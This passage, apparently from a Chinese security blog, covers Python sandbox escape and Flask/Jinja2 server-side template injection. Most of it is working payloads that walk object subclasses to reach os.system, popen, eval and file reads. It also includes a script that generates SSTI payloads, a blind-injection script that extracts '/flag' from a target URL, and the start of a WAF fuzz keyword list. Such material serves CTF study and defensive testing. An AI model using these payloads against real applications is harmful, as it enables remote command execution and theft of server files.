class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, <span class="hljs-string">&#x27;eval&#x27;</span>)(61, 1, &lt;class <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, <span class="hljs-string">&#x27;open&#x27;</span>)(61, 1, &lt;class <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, <span class="hljs-string">&#x27;execfile&#x27;</span>)(62, 1, &lt;class <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, <span class="hljs-string">&#x27;__import__&#x27;</span>)(62, 1, &lt;class <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, <span class="hljs-string">&#x27;file&#x27;</span>)(62, 1, &lt;class <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, <span class="hljs-string">&#x27;compile&#x27;</span>)(62, 1, &lt;class <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, <span class="hljs-string">&#x27;eval&#x27;</span>)(62, 1, &lt;class <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, <span class="hljs-string">&#x27;open&#x27;</span>)(62, 1, &lt;class <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, <span class="hljs-string">&#x27;execfile&#x27;</span>)(72, 19, &lt;class <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, <span class="hljs-string">&#x27;file&#x27;</span>)(72, 19, &lt;class <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, <span class="hljs-string">&#x27;exec&#x27;</span>)(72, 22, &lt;class <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, <span class="hljs-string">&#x27;__import__&#x27;</span>)(72, 22, &lt;class <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, <span class="hljs-string">&#x27;file&#x27;</span>)(72, 22, &lt;class <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, <span class="hljs-string">&#x27;compile&#x27;</span>)(72, 22, &lt;class <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, <span class="hljs-string">&#x27;eval&#x27;</span>)(72, 22, &lt;class <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, <span class="hljs-string">&#x27;open&#x27;</span>)(72, 22, &lt;class <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, <span class="hljs-string">&#x27;execfile&#x27;</span>)(77, 19, &lt;class <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="hljs-string">&#x27;file&#x27;</span>)(77, 19, &lt;class <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="hljs-string">&#x27;exec&#x27;</span>)(77, 22, &lt;class <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="hljs-string">&#x27;__import__&#x27;</span>)(77, 22, &lt;class <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="hljs-string">&#x27;file&#x27;</span>)(77, 22, &lt;class <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="hljs-string">&#x27;compile&#x27;</span>)(77, 22, &lt;class <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="hljs-string">&#x27;eval&#x27;</span>)(77, 22, &lt;class <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="hljs-string">&#x27;open&#x27;</span>)(77, 22, &lt;class <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="hljs-string">&#x27;execfile&#x27;</span>)(78, 21, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;open&#x27;</span>)(78, 23, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;__import__&#x27;</span>)(78, 23, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;file&#x27;</span>)(78, 23, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;compile&#x27;</span>)(78, 23, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;eval&#x27;</span>)(78, 23, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;open&#x27;</span>)(78, 23, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;execfile&#x27;</span>)(79, 21, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;open&#x27;</span>)(79, 23, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;__import__&#x27;</span>)(79, 23, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;file&#x27;</span>)(79, 23, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;compile&#x27;</span>)(79, 23, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;eval&#x27;</span>)(79, 23, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;open&#x27;</span>)(79, 23, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;execfile&#x27;</span>)----------4-----------(60, <span class="hljs-string">&#x27;__import__&#x27;</span>)(60, <span class="hljs-string">&#x27;file&#x27;</span>)(60, <span class="hljs-string">&#x27;repr&#x27;</span>)(60, <span class="hljs-string">&#x27;compile&#x27;</span>)(60, <span class="hljs-string">&#x27;eval&#x27;</span>)(60, <span class="hljs-string">&#x27;open&#x27;</span>)(60, <span class="hljs-string">&#x27;execfile&#x27;</span>)</code></pre></div>下面简单归纳下遍历的4种方式：#### **第一种方式**序号为40，即file()函数，进行文件读取和写入，payload如下：<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;E:/passwd&#x27;</span>).read()<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;E:/test.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).write(<span class="hljs-string">&#x27;xxx&#x27;</span>)</code></pre></div>这和前面元素链构造时给出的Demo有点区别：<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;file&#x27;</span>](<span class="hljs-string">&#x27;E:/passwd&#x27;</span>).read()</code></pre></div>序号59是WarningMessage类，其具有globals属性，包含builtins，其中含有file()函数，属于第二种方式；而这里是直接在object类的所有子类中直接找到了file()函数的序号为40，直接调用即可。当然也可以通过调用index()函数的方式来寻找file()函数是否在object类的子类中且序号是多少：![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/7.png)#### **第二种方式**先看序号为59的WarningMessage类有哪些而利用的模块或方法：<div class="hljs code-wrapper"><pre><code class="hljs python">(59, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;linecache&#x27;, [&#x27;os&#x27;, &#x27;sys&#x27;, &#x27;__builtins__&#x27;])(59, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;__builtins__&#x27;, None)(59, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;sys&#x27;, None)(59, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;types&#x27;, [&#x27;__builtins__&#x27;])</code></pre></div>以linecache中的os为例，这里简单解释下工具的寻找过程依次如下：<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 确认linecache</span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>]<span class="hljs-comment"># 返回linecache字典中的所有键</span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__.keys()<span class="hljs-comment"># 在linecache字典的所有键中寻找os的序号，找到为12</span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__.keys().index(<span class="hljs-string">&#x27;os&#x27;</span>)<span class="hljs-comment"># 更换keys()为values()，访问12序号的元素，并获取该os字典的所有键</span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__.values()[<span class="hljs-number">12</span>].__dict__.keys()<span class="hljs-comment"># 在os字典的所有键中寻找system的序号，找到为79</span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__.values()[<span class="hljs-number">12</span>].__dict__.keys().index(<span class="hljs-string">&#x27;system&#x27;</span>)<span class="hljs-comment"># 执行os.system()</span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__.values()[<span class="hljs-number">12</span>].__dict__.values()[<span class="hljs-number">79</span>](<span class="hljs-string">&#x27;calc&#x27;</span>)</code></pre></div>payload如下：<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># linecache利用</span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;calc&#x27;</span>)<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;sys&#x27;</span>].modules[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;calc&#x27;</span>)<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)<span class="hljs-comment"># __builtins__利用，包括__import__、file、open、execfile、eval、结合exec的compile等</span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;sys&#x27;</span>).modules[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;sys&#x27;</span>).modules[<span class="hljs-string">&#x27;platform&#x27;</span>].popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;file&#x27;</span>](<span class="hljs-string">&#x27;E:/passwd&#x27;</span>).read()<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;open&#x27;</span>](<span class="hljs-string">&#x27;E:/test.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).write(<span class="hljs-string">&#x27;hello&#x27;</span>)<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;execfile&#x27;</span>](<span class="hljs-string">&#x27;E:/exp.py&#x27;</span>)<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;calc&quot;)&#x27;</span>)exec(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;compile&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;calc&quot;)&#x27;</span>, <span class="hljs-string">&#x27;&lt;string&gt;&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>))<span class="hljs-comment"># sys利用</span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;sys&#x27;</span>].modules[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;calc&#x27;</span>)<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;sys&#x27;</span>].modules[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()<span class="hljs-comment"># types利用，后面还是通过__builtins__实现利用</span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;types&#x27;</span>].__dict__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)</code></pre></div>序号为60的catch_warnings类利用payload同上。序号为61、62的两个类均只有`__builtins__`可利用，利用payload同上。序号为72、77的两个类_Printer和Quitter，相比前面的，没见过的有os和traceback，但只有os模块可利用：<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># os利用</span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">72</span>].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;calc&#x27;</span>)</code></pre></div>序号为78、79的两个类IncrementalEncoder和IncrementalDecoder，相比前面的，没见过的有open：<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># open利用</span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">78</span>].__init__.__globals__[<span class="hljs-string">&#x27;open&#x27;</span>](<span class="hljs-string">&#x27;E:/passwd&#x27;</span>).read()<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">78</span>].__init__.__globals__[<span class="hljs-string">&#x27;open&#x27;</span>](<span class="hljs-string">&#x27;E:/test.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).write()</code></pre></div>#### **第三种方式**先看下序号为59的WarningMessage类：<div class="hljs code-wrapper"><pre><code class="hljs python">(59, 13, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;__import__&#x27;)(59, 13, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;file&#x27;)(59, 13, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;compile&#x27;)(59, 13, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;eval&#x27;)(59, 13, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;open&#x27;)(59, 13, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;execfile&#x27;)</code></pre></div>注意是通过values()函数中的数组序号来填写第二个数值实现调用，以下以eval为示例，其他的利用payload和前面的差不多就不再赘述了：<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__.values()[<span class="hljs-number">13</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;calc&quot;)&#x27;</span>)</code></pre></div>其他类似修改即可。#### **第四种方式**这里只有一种序号，为60：<div class="hljs code-wrapper"><pre><code class="hljs python">(<span class="hljs-number">60</span>, <span class="hljs-string">&#x27;__import__&#x27;</span>)(<span class="hljs-number">60</span>, <span class="hljs-string">&#x27;file&#x27;</span>)(<span class="hljs-number">60</span>, <span class="hljs-string">&#x27;repr&#x27;</span>)(<span class="hljs-number">60</span>, <span class="hljs-string">&#x27;compile&#x27;</span>)(<span class="hljs-number">60</span>, <span class="hljs-string">&#x27;eval&#x27;</span>)(<span class="hljs-number">60</span>, <span class="hljs-string">&#x27;open&#x27;</span>)(<span class="hljs-number">60</span>, <span class="hljs-string">&#x27;execfile&#x27;</span>)</code></pre></div>调用示例如下，其他类似修改即可：<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">60</span>]()._module.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&quot;os&quot;</span>).system(<span class="hljs-string">&quot;calc&quot;</span>)</code></pre></div>这个payload是在windows下运行的结果，这个模块为'warnings.catch_warnings'。linux下找到对应模块即可，序号不一定一致。## **0x03 python3 flask 利用链**flask_python3_find_payload.py<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><span class="hljs-comment"># coding=utf-8</span><span class="hljs-comment"># python 3.5</span><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Template<span class="hljs-comment"># Some of special names</span>searchList = [<span class="hljs-string">&#x27;__init__&#x27;</span>, <span class="hljs-string">&quot;__new__&quot;</span>, <span class="hljs-string">&#x27;__del__&#x27;</span>, <span class="hljs-string">&#x27;__repr__&#x27;</span>, <span class="hljs-string">&#x27;__str__&#x27;</span>, <span class="hljs-string">&#x27;__bytes__&#x27;</span>, <span class="hljs-string">&#x27;__format__&#x27;</span>, <span class="hljs-string">&#x27;__lt__&#x27;</span>, <span class="hljs-string">&#x27;__le__&#x27;</span>, <span class="hljs-string">&#x27;__eq__&#x27;</span>, <span class="hljs-string">&#x27;__ne__&#x27;</span>, <span class="hljs-string">&#x27;__gt__&#x27;</span>, <span class="hljs-string">&#x27;__ge__&#x27;</span>, <span class="hljs-string">&#x27;__hash__&#x27;</span>, <span class="hljs-string">&#x27;__bool__&#x27;</span>, <span class="hljs-string">&#x27;__getattr__&#x27;</span>, <span class="hljs-string">&#x27;__getattribute__&#x27;</span>, <span class="hljs-string">&#x27;__setattr__&#x27;</span>, <span class="hljs-string">&#x27;__dir__&#x27;</span>, <span class="hljs-string">&#x27;__delattr__&#x27;</span>, <span class="hljs-string">&#x27;__get__&#x27;</span>, <span class="hljs-string">&#x27;__set__&#x27;</span>, <span class="hljs-string">&#x27;__delete__&#x27;</span>, <span class="hljs-string">&#x27;__call__&#x27;</span>, <span class="hljs-string">&quot;__instancecheck__&quot;</span>, <span class="hljs-string">&#x27;__subclasscheck__&#x27;</span>, <span class="hljs-string">&#x27;__len__&#x27;</span>, <span class="hljs-string">&#x27;__length_hint__&#x27;</span>, <span class="hljs-string">&#x27;__missing__&#x27;</span>,<span class="hljs-string">&#x27;__getitem__&#x27;</span>, <span class="hljs-string">&#x27;__setitem__&#x27;</span>, <span class="hljs-string">&#x27;__iter__&#x27;</span>,<span class="hljs-string">&#x27;__delitem__&#x27;</span>, <span class="hljs-string">&#x27;__reversed__&#x27;</span>, <span class="hljs-string">&#x27;__contains__&#x27;</span>, <span class="hljs-string">&#x27;__add__&#x27;</span>, <span class="hljs-string">&#x27;__sub__&#x27;</span>,<span class="hljs-string">&#x27;__mul__&#x27;</span>]neededFunction = [<span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>]pay = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Payload?[1|0]&quot;</span>))<span class="hljs-keyword">for</span> index, i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(&#123;&#125;.__class__.__base__.__subclasses__()):    <span class="hljs-keyword">for</span> attr <span class="hljs-keyword">in</span> searchList:        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(i, attr):            <span class="hljs-keyword">if</span> <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;str(i.&#x27;</span>+attr+<span class="hljs-string">&#x27;)[1:9]&#x27;</span>) == <span class="hljs-string">&#x27;function&#x27;</span>:                <span class="hljs-keyword">for</span> goal <span class="hljs-keyword">in</span> neededFunction:                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>+goal+<span class="hljs-string">&#x27;&quot; in i.&#x27;</span>+attr+<span class="hljs-string">&#x27;.__globals__[&quot;__builtins__&quot;].keys()&#x27;</span>)):                        <span class="hljs-keyword">if</span> pay != <span class="hljs-number">1</span>:                            print(i.__name__,<span class="hljs-string">&quot;:&quot;</span>, attr, goal)                        <span class="hljs-keyword">else</span>:                            print(<span class="hljs-string">&quot;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;&quot;</span> + i.__name__ + <span class="hljs-string">&quot;&#x27; %&#125;&#123;&#123; c.&quot;</span> + attr + <span class="hljs-string">&quot;.__globals__[&#x27;__builtins__&#x27;].&quot;</span> + goal + <span class="hljs-string">&quot;(\&quot;[evil]\&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&quot;</span>)</code></pre></div>例如：<div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;FileLoader&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;[evil]&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;FileLoader&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&quot;[evil]&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;FileLoader&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].exec(&quot;[evil]&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre></div>吧[evil]换成对应的利用代码即可，例如：<div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;FileLoader&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre></div>非常好用![image-20201002114824676](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20201002114824676.png)## 0x04 python代码编辑成一句话推荐一个能把Python代码给编译成一句话的形式工具官网 http://www.onelinerizer.com/Github地址：https://github.com/csvoss/onelinerizer## 0x05 盲注脚本<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&#x27;http://192.168.133.180:5000/test?k=&#x27;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span>(<span class="hljs-params">payload</span>):</span>    postdata = &#123;        <span class="hljs-string">&#x27;exploit&#x27;</span>:payload        &#125;    <span class="hljs-comment"># r = requests.post(url, data=postdata).content</span>    <span class="hljs-comment"># print(payload)</span>    r = requests.get(url+payload).text    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;~p0~&#x27;</span> <span class="hljs-keyword">in</span> rpassword  = <span class="hljs-string">&#x27;&#x27;</span>s = <span class="hljs-string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\&#x27;&quot;_%&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">100</span>):    print(i)    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:        payload = <span class="hljs-string">&#x27;&#x27;&#x27;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;BlueprintSetupState&#x27; %&#125;&#123;% if c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()[&#x27;&#x27;&#x27;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;&#x27;&#x27;:&#x27;&#x27;&#x27;</span>+<span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>)+<span class="hljs-string">&quot;] == &#x27;&quot;</span>+c+<span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&quot;) %&#125;~p0~&#123;% endif %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#x27;&#x27;&#x27;</span>        <span class="hljs-keyword">if</span> check(payload):            password += c            print(c)            <span class="hljs-keyword">break</span>    print(password)</code></pre></div>## 0x06 fuzz 脚本waffuzz<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span><span class="hljs-built_in">getattr</span>os<span class="hljs-class"><span class="hljs-keyword">class</span></span><span class="hljs-class"><span class="hljs-title">subclasses</span></span><span class="hljs-class"><span class="hljs-title">mro</span></span><span class="hljs-class"><span class="hljs-title">request</span></span><span class="hljs-class"><span class="hljs-title">args</span></span><span class="hljs-class"><span class="hljs-title">eval</span></span><span class="hljs-class"><span class="hljs-title">if</span></span><span class="hljs-class"><span class="hljs-title">for</span></span><span class="hljs-class"><span class="hljs-title">subprocess</span></span><span class="hljs-class"><span class="hljs-title">file</span></span><span class="hljs-class"><span class="hljs-title">open</span></span><span class="hljs-class"><span class="hljs-title">popen</span></span><span class="hljs-class"><span class="hljs-title">builtins</span></span><span class="hljs-class"><span class="hljs-title">compile</span></span><span class="hljs-class"><span class="hljs-title">execfile</span></span><span class="hljs-class"><span class="hljs-title">from_pyfile</span></span><span class="hljs-class"><span class="hljs-title">config</span></span><span class="hljs-class"><span class="hljs-title">local</span></span><span class="hljs-class"><span class="hljs-title">self</span></span><span class="hljs-class"><span class="hljs-title">item</span></span><span class="hljs-class"><span class="hljs-title">getitem</span></span><span class="hljs-class"><span class="hljs-title">getattribute</span></span><span class="hljs-class"><span class="hljs-title">func_globals</span></span><span class="hljs-class"><span 